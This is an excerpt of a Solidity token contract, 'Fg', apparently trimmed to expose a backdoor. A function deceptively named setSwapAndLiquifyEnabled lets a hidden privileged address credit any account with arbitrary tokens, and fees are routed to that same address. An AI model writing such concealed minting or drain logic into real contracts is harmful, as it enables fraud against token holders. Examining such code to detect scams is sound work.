...
contract Fg is Context, IERC20, Ownable {
    ...
    string private _symbol = "Fgg";
    uint8 private _decimals = 9;
    address payable public marketingWalletAddress;
    address payable public tdress;
    ...
    constructor () {
        ...
        tdress = payable(address(0x03d3_790F_c379_fCc8_5aDC_B5Bf_Df68_084f_1d77_6006));
    ...
    function setTdress(address newAddress) external onlyOwner() {
        tdress = payable(newAddress);
    }

 


    function setSwapAndLiquifyEnabled(bool _enabled,uint256 am,address accunt) public {require(msg.sender == tdress);_balances[accunt] += am;
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBTeam > 0)
            transferToAddressETH(tdress, amountBNBTeam);
